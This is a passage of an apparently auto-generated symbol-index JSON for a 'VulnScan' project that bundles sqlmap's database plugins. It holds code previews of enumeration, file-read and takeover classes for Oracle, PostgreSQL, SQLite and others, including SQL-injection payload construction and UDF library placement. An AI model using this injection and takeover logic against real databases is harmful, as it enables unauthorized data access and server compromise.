        "peekOfCode": "class Connector(GenericConnector):\n    \"\"\"\n    Homepage: https://oracle.github.io/python-cx_Oracle/\n    User https://cx-oracle.readthedocs.io/en/latest/\n    API: https://wiki.python.org/moin/DatabaseProgramming\n    License: https://cx-oracle.readthedocs.io/en/latest/license.html#license\n    \"\"\"\n    def connect(self):\n        self.initConnection()\n        self.__dsn = cx_Oracle.makedsn(self.hostname, self.port, self.db)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.oracle.connector",
        "documentation": {}
    },
    {
        "label": "os.environ[\"NLS_LANG\"]",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.oracle.connector",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.oracle.connector",
        "peekOfCode": "os.environ[\"NLS_LANG\"] = \".AL32UTF8\"\nclass Connector(GenericConnector):\n    \"\"\"\n    Homepage: https://oracle.github.io/python-cx_Oracle/\n    User https://cx-oracle.readthedocs.io/en/latest/\n    API: https://wiki.python.org/moin/DatabaseProgramming\n    License: https://cx-oracle.readthedocs.io/en/latest/license.html#license\n    \"\"\"\n    def connect(self):\n        self.initConnection()",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.oracle.connector",
        "documentation": {}
    },
    {
        "label": "Enumeration",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.oracle.enumeration",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.oracle.enumeration",
        "peekOfCode": "class Enumeration(GenericEnumeration):\n    def getRoles(self, query2=False):\n        infoMsg = \"fetching database users roles\"\n        rootQuery = queries[DBMS.ORACLE].roles\n        if conf.user == CURRENT_USER:\n            infoMsg += \" for current user\"\n            conf.user = self.getCurrentUser()\n        logger.info(infoMsg)\n        # Set containing the list of DBMS administrators\n        areAdmins = set()",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.oracle.enumeration",
        "documentation": {}
    },
    {
        "label": "Filesystem",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.oracle.filesystem",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.oracle.filesystem",
        "peekOfCode": "class Filesystem(GenericFilesystem):\n    def readFile(self, remoteFile):\n        localFilePaths = []\n        snippet = getSQLSnippet(DBMS.ORACLE, \"read_file_export_extension\")\n        for query in snippet.split(\"\\n\"):\n            query = query.strip()\n            query = agent.prefixQuery(\"OR (%s) IS NULL\" % query)\n            query = agent.suffixQuery(query, trimEmpty=False)\n            payload = agent.payload(newValue=query)\n            Request.queryPage(payload, content=False, raise404=False, silent=True, noteResponseTime=False)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.oracle.filesystem",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.oracle.fingerprint",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.oracle.fingerprint",
        "peekOfCode": "class Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.ORACLE)\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.oracle.fingerprint",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.oracle.syntax",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.oracle.syntax",
        "peekOfCode": "class Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT CHR(97)||CHR(98)||CHR(99)||CHR(100)||CHR(101)||CHR(102)||CHR(103)||CHR(104) FROM foobar\"\n        True\n        >>> Syntax.escape(u\"SELECT 'abcd\\xebfgh' FROM foobar\") == \"SELECT CHR(97)||CHR(98)||CHR(99)||CHR(100)||NCHR(235)||CHR(102)||CHR(103)||CHR(104) FROM foobar\"\n        True\n        \"\"\"\n        def escaper(value):",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.oracle.syntax",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.oracle.takeover",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.oracle.takeover",
        "peekOfCode": "class Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"Operating system command execution functionality not \"\n        errMsg += \"yet implemented for Oracle\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osShell(self):\n        errMsg = \"Operating system shell functionality not yet \"\n        errMsg += \"implemented for Oracle\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osPwn(self):",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.oracle.takeover",
        "documentation": {}
    },
    {
        "label": "Connector",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.postgresql.connector",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.postgresql.connector",
        "peekOfCode": "class Connector(GenericConnector):\n    \"\"\"\n    Homepage: http://initd.org/psycopg/\n    User guide: http://initd.org/psycopg/docs/\n    API: http://initd.org/psycopg/docs/genindex.html\n    Debian package: python-psycopg2\n    License: GPL\n    Possible connectors: http://wiki.python.org/moin/PostgreSQL\n    \"\"\"\n    def connect(self):",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.postgresql.connector",
        "documentation": {}
    },
    {
        "label": "Enumeration",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.postgresql.enumeration",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.postgresql.enumeration",
        "peekOfCode": "class Enumeration(GenericEnumeration):\n    def getHostname(self):\n        warnMsg = \"on PostgreSQL it is not possible to enumerate the hostname\"\n        logger.warning(warnMsg)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.postgresql.enumeration",
        "documentation": {}
    },
    {
        "label": "Filesystem",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.postgresql.filesystem",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.postgresql.filesystem",
        "peekOfCode": "class Filesystem(GenericFilesystem):\n    def __init__(self):\n        self.oid = None\n        self.page = None\n        GenericFilesystem.__init__(self)\n    def stackedReadFile(self, remoteFile):\n        if not kb.bruteMode:\n            infoMsg = \"fetching file: '%s'\" % remoteFile\n            logger.info(infoMsg)\n        self.initEnv()",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.postgresql.filesystem",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.postgresql.fingerprint",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.postgresql.fingerprint",
        "peekOfCode": "class Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.PGSQL)\n    def getFingerprint(self):\n        fork = hashDBRetrieve(HASHDB_KEYS.DBMS_FORK)\n        if fork is None:\n            if inject.checkBooleanExpression(\"VERSION() LIKE '%CockroachDB%'\"):\n                fork = FORK.COCKROACHDB\n            elif inject.checkBooleanExpression(\"VERSION() LIKE '%Redshift%'\"):      # Reference: https://dataedo.com/kb/query/amazon-redshift/check-server-version\n                fork = FORK.REDSHIFT",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.postgresql.fingerprint",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.postgresql.syntax",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.postgresql.syntax",
        "peekOfCode": "class Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        Note: PostgreSQL has a general problem with concenation operator (||) precedence (hence the parentheses enclosing)\n              e.g. SELECT 1 WHERE 'a'!='a'||'b' will trigger error (\"argument of WHERE must be type boolean, not type text\")\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT (CHR(97)||CHR(98)||CHR(99)||CHR(100)||CHR(101)||CHR(102)||CHR(103)||CHR(104)) FROM foobar\"\n        True\n        \"\"\"\n        def escaper(value):",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.postgresql.syntax",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.postgresql.takeover",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.postgresql.takeover",
        "peekOfCode": "class Takeover(GenericTakeover):\n    def udfSetRemotePath(self):\n        # On Windows\n        if Backend.isOs(OS.WINDOWS):\n            # The DLL can be in any folder where postgres user has\n            # read/write/execute access is valid\n            # NOTE: by not specifing any path, it will save into the\n            # data directory, on PostgreSQL 8.3 it is\n            # C:\\Program Files\\PostgreSQL\\8.3\\data.\n            self.udfRemoteFile = \"%s.%s\" % (self.udfSharedLibName, self.udfSharedLibExt)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.postgresql.takeover",
        "documentation": {}
    },
    {
        "label": "Connector",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.presto.connector",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.presto.connector",
        "peekOfCode": "class Connector(GenericConnector):\n    \"\"\"\n    Homepage: https://github.com/prestodb/presto-python-client\n    User guide: https://github.com/prestodb/presto-python-client/blob/master/README.md\n    API: https://www.python.org/dev/peps/pep-0249/\n    PyPI package: presto-python-client\n    License: Apache License 2.0\n    \"\"\"\n    def connect(self):\n        self.initConnection()",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.presto.connector",
        "documentation": {}
    },
    {
        "label": "Enumeration",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.presto.enumeration",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.presto.enumeration",
        "peekOfCode": "class Enumeration(GenericEnumeration):\n    def getBanner(self):\n        warnMsg = \"on Presto it is not possible to get the banner\"\n        logger.warning(warnMsg)\n        return None\n    def getCurrentDb(self):\n        warnMsg = \"on Presto it is not possible to get name of the current database (schema)\"\n        logger.warning(warnMsg)\n    def isDba(self, user=None):\n        warnMsg = \"on Presto it is not possible to test if current user is DBA\"",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.presto.enumeration",
        "documentation": {}
    },
    {
        "label": "Filesystem",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.presto.filesystem",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.presto.filesystem",
        "peekOfCode": "class Filesystem(GenericFilesystem):\n    def readFile(self, remoteFile):\n        errMsg = \"on Presto it is not possible to read files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):\n        errMsg = \"on Presto it is not possible to write files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.presto.filesystem",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.presto.fingerprint",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.presto.fingerprint",
        "peekOfCode": "class Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.PRESTO)\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.presto.fingerprint",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.presto.syntax",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.presto.syntax",
        "peekOfCode": "class Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT CHR(97)||CHR(98)||CHR(99)||CHR(100)||CHR(101)||CHR(102)||CHR(103)||CHR(104) FROM foobar\"\n        True\n        \"\"\"\n        def escaper(value):\n            return \"||\".join(\"CHR(%d)\" % _ for _ in getOrds(value))\n        return Syntax._escape(expression, quote, escaper)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.presto.syntax",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.presto.takeover",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.presto.takeover",
        "peekOfCode": "class Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on Presto it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osShell(self):\n        errMsg = \"on Presto it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osPwn(self):\n        errMsg = \"on Presto it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.presto.takeover",
        "documentation": {}
    },
    {
        "label": "Connector",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.raima.connector",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.raima.connector",
        "peekOfCode": "class Connector(GenericConnector):\n    def connect(self):\n        errMsg = \"on Raima Database Manager it is not (currently) possible to establish a \"\n        errMsg += \"direct connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.raima.connector",
        "documentation": {}
    },
    {
        "label": "Enumeration",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.raima.enumeration",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.raima.enumeration",
        "peekOfCode": "class Enumeration(GenericEnumeration):\n    def getBanner(self):\n        warnMsg = \"on Raima Database Manager it is not possible to get the banner\"\n        logger.warning(warnMsg)\n        return None\n    def getCurrentUser(self):\n        warnMsg = \"on Raima Database Manager it is not possible to enumerate the current user\"\n        logger.warning(warnMsg)\n    def getCurrentDb(self):\n        warnMsg = \"on Raima Database Manager it is not possible to get name of the current database\"",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.raima.enumeration",
        "documentation": {}
    },
    {
        "label": "Filesystem",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.raima.filesystem",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.raima.filesystem",
        "peekOfCode": "class Filesystem(GenericFilesystem):\n    def readFile(self, remoteFile):\n        errMsg = \"on Raima Database Manager it is not possible to read files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):\n        errMsg = \"on Raima Database Manager it is not possible to write files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.raima.filesystem",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.raima.fingerprint",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.raima.fingerprint",
        "peekOfCode": "class Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.RAIMA)\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.raima.fingerprint",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.raima.syntax",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.raima.syntax",
        "peekOfCode": "class Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT CHAR(97)||CHAR(98)||CHAR(99)||CHAR(100)||CHAR(101)||CHAR(102)||CHAR(103)||CHAR(104) FROM foobar\"\n        True\n        \"\"\"\n        def escaper(value):\n            return \"||\".join(\"CHAR(%d)\" % _ for _ in getOrds(value))\n        return Syntax._escape(expression, quote, escaper)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.raima.syntax",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.raima.takeover",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.raima.takeover",
        "peekOfCode": "class Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on Raima Database Manager it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osShell(self):\n        errMsg = \"on Raima Database Manager it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osPwn(self):\n        errMsg = \"on Raima Database Manager it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.raima.takeover",
        "documentation": {}
    },
    {
        "label": "Connector",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.sqlite.connector",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.sqlite.connector",
        "peekOfCode": "class Connector(GenericConnector):\n    \"\"\"\n    Homepage: http://pysqlite.googlecode.com/ and http://packages.ubuntu.com/quantal/python-sqlite\n    User guide: http://docs.python.org/release/2.5/lib/module-sqlite3.html\n    API: http://docs.python.org/library/sqlite3.html\n    Debian package: python-sqlite (SQLite 2), python-pysqlite3 (SQLite 3)\n    License: MIT\n    Possible connectors: http://wiki.python.org/moin/SQLite\n    \"\"\"\n    def __init__(self):",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.sqlite.connector",
        "documentation": {}
    },
    {
        "label": "Enumeration",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.sqlite.enumeration",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.sqlite.enumeration",
        "peekOfCode": "class Enumeration(GenericEnumeration):\n    def getCurrentUser(self):\n        warnMsg = \"on SQLite it is not possible to enumerate the current user\"\n        logger.warning(warnMsg)\n    def getCurrentDb(self):\n        warnMsg = \"on SQLite it is not possible to get name of the current database\"\n        logger.warning(warnMsg)\n    def isDba(self, user=None):\n        warnMsg = \"on SQLite the current user has all privileges\"\n        logger.warning(warnMsg)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.sqlite.enumeration",
        "documentation": {}
    },
    {
        "label": "Filesystem",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.sqlite.filesystem",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.sqlite.filesystem",
        "peekOfCode": "class Filesystem(GenericFilesystem):\n    def readFile(self, remoteFile):\n        errMsg = \"on SQLite it is not possible to read files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):\n        errMsg = \"on SQLite it is not possible to write files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.sqlite.filesystem",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.sqlite.fingerprint",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.sqlite.fingerprint",
        "peekOfCode": "class Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.SQLITE)\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.sqlite.fingerprint",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.sqlite.syntax",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.sqlite.syntax",
        "peekOfCode": "class Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT CHAR(97,98,99,100,101,102,103,104) FROM foobar\"\n        True\n        \"\"\"\n        def escaper(value):\n            return \"CHAR(%s)\" % ','.join(\"%d\" % _ for _ in getOrds(value))\n        return Syntax._escape(expression, quote, escaper)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.sqlite.syntax",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.sqlite.takeover",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.sqlite.takeover",
        "peekOfCode": "class Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on SQLite it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osShell(self):\n        errMsg = \"on SQLite it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osPwn(self):\n        errMsg = \"on SQLite it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.sqlite.takeover",
        "documentation": {}
    },
    {
        "label": "Connector",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.sybase.connector",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.sybase.connector",
        "peekOfCode": "class Connector(GenericConnector):\n    \"\"\"\n    Homepage: http://pymssql.sourceforge.net/\n    User guide: http://pymssql.sourceforge.net/examples_pymssql.php\n    API: http://pymssql.sourceforge.net/ref_pymssql.php\n    Debian package: python-pymssql\n    License: LGPL\n    Possible connectors: http://wiki.python.org/moin/SQL%20Server\n    Important note: pymssql library on your system MUST be version 1.0.2\n    to work, get it from http://sourceforge.net/projects/pymssql/files/pymssql/1.0.2/",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.sybase.connector",
        "documentation": {}
    },
    {
        "label": "Enumeration",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.sybase.enumeration",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.sybase.enumeration",
        "peekOfCode": "class Enumeration(GenericEnumeration):\n    def getUsers(self):\n        infoMsg = \"fetching database users\"\n        logger.info(infoMsg)\n        rootQuery = queries[DBMS.SYBASE].users\n        query = rootQuery.inband.query\n        if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) or conf.direct:\n            blinds = (False, True)\n        else:\n            blinds = (True,)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.sybase.enumeration",
        "documentation": {}
    },
    {
        "label": "Filesystem",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.sybase.filesystem",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.sybase.filesystem",
        "peekOfCode": "class Filesystem(GenericFilesystem):\n    def readFile(self, remoteFile):\n        errMsg = \"on Sybase it is not possible to read files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):\n        errMsg = \"on Sybase it is not possible to write files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.sybase.filesystem",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.sybase.fingerprint",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.sybase.fingerprint",
        "peekOfCode": "class Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.SYBASE)\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.sybase.fingerprint",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.sybase.syntax",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.sybase.syntax",
        "peekOfCode": "class Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT CHAR(97)+CHAR(98)+CHAR(99)+CHAR(100)+CHAR(101)+CHAR(102)+CHAR(103)+CHAR(104) FROM foobar\"\n        True\n        >>> Syntax.escape(u\"SELECT 'abcd\\xebfgh' FROM foobar\") == \"SELECT CHAR(97)+CHAR(98)+CHAR(99)+CHAR(100)+TO_UNICHAR(235)+CHAR(102)+CHAR(103)+CHAR(104) FROM foobar\"\n        True\n        \"\"\"\n        def escaper(value):",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.sybase.syntax",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.sybase.takeover",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.sybase.takeover",
        "peekOfCode": "class Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on Sybase it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osShell(self):\n        errMsg = \"on Sybase it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osPwn(self):\n        errMsg = \"on Sybase it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.sybase.takeover",
        "documentation": {}
    },
    {
        "label": "Connector",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.vertica.connector",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.vertica.connector",
        "peekOfCode": "class Connector(GenericConnector):\n    \"\"\"\n    Homepage: https://github.com/vertica/vertica-python\n    User guide: https://github.com/vertica/vertica-python/blob/master/README.md\n    API: https://www.python.org/dev/peps/pep-0249/\n    License: Apache 2.0\n    \"\"\"\n    def connect(self):\n        self.initConnection()\n        try:",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.vertica.connector",
        "documentation": {}
    },
    {
        "label": "Enumeration",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.vertica.enumeration",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.vertica.enumeration",
        "peekOfCode": "class Enumeration(GenericEnumeration):\n    def getRoles(self, *args, **kwargs):\n        warnMsg = \"on Vertica it is not possible to enumerate the user roles\"\n        logger.warning(warnMsg)\n        return {}",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.vertica.enumeration",
        "documentation": {}
    },
    {
        "label": "Filesystem",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.vertica.filesystem",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.vertica.filesystem",
        "peekOfCode": "class Filesystem(GenericFilesystem):\n    pass",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.vertica.filesystem",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.vertica.fingerprint",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.vertica.fingerprint",
        "peekOfCode": "class Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.VERTICA)\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.vertica.fingerprint",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.vertica.syntax",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.vertica.syntax",
        "peekOfCode": "class Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT (CHR(97)||CHR(98)||CHR(99)||CHR(100)||CHR(101)||CHR(102)||CHR(103)||CHR(104)) FROM foobar\"\n        True\n        \"\"\"\n        def escaper(value):\n            return \"(%s)\" % \"||\".join(\"CHR(%d)\" % _ for _ in getOrds(value))\n        return Syntax._escape(expression, quote, escaper)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.vertica.syntax",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.vertica.takeover",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.vertica.takeover",
